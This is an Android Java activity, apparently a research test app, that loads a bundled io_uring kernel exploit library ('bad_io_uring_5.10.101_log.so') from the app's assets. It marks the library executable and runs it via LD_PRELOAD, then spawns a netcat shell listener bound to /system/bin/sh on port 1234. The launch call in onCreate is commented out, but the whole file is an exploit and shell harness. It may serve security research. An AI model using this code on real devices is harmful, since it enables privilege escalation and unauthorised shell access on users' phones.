package com.example.testapp;

import static android.content.ContentValues.TAG;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class  MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // new Thread(this::runReverseShell).start();
    }

    void runReverseShell() {
        if (EXP_NAME != null) {
            runPoc(EXP_NAME);
        }

        String command = "nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l";
        runCommand(command);
    }

    void runCommand(String command) {
        Log.i("MainActivity", "running command: " + command);
        try {
            new ProcessBuilder("sh", "-c", command).redirectErrorStream(true).start();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    
    // public static final String EXP_NAME = "bad_io_uring_5.10.101";
    // public static final String EXP_NAME = "bad_io_uring_5.10.101_log";
    public static final String EXP_NAME = "bad_io_uring_5.10.101_log.so";

    void runPoc(String poc) {
        if (poc == null) {
            return;
        }

        Log.i("MainActivity", "running exploit: " + poc);
        
        String dataDir = getApplicationInfo().dataDir;
        String outputFile = dataDir + "/" + poc;
        try {
            Path dst = Paths.get(outputFile);
            Files.copy(getAssets().open("exploits/" + poc),
                        dst,
                        StandardCopyOption.REPLACE_EXISTING);
            dst.toFile().setExecutable(true);

            runCommand("LD_LIBRARY_PATH=" + dataDir + " LD_PRELOAD=" + dst + " sleep 10");
            // runCommand(dst.toString() + " 2>&1 | log -t exploit");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
